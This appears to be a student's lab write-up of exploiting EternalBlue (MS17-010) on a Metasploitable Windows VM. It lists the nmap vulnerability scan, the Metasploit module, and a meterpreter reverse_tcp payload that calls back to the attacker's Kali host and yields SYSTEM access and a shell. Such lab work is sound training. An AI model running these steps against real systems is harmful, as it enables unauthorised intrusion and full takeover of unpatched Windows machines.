Eternal Blue

Objective:

- I initiated the assignment by executing the **ifconfig** command on my Kali VM, identifying the machine's IP address as 10.0.2.6.


- I then proceeded with an nmap scan targeting the IP address to locate the metasploitable Windows machine. The results showed the machine's IP address as 10.0.2.8, and the open ports 139 and 445 indicated the running SMB service.


- To leverage nse scripts, I ran **nmap -Pn -p139,445 --script=smbvuln-* 10.0.2.8**. The output highlighted the vulnerability **smb-vuln-ms17-010**, susceptible to remote code execution and classified as a high-risk factor.


- To proceed, I launched the Metasploit framework using the **msfconsole** command.


- Within Metasploit, I searched for the **eternalblue** exploit using **search eternalblue**.


- I selected the **MS17-010 EternalBlue SMB Remote Windows** module with **use exploit/windows/smb/ms17_010_eternalblue**. By default, the PAYLOAD was set to **windows/x64/meterpreter/reverse_tcp**. Necessary adjustments were made to RHOSTS (10.0.2.8, Target IP), LHOST (10.0.2.6, Kali IP), and LPORT (4444, designated listening port).


- Initiating the attack, I executed the **exploit** command.


- To confirm successful entry into the metasploitable VM, I ran **sysinfo**. Verification of the user-level access was achieved with the **getuid** command, revealing the access level as **SYSTEM** - the highest privilege on the machine.


- Lastly, to imprint my identity on the remote machine's terminal, I invoked the **shell** command.
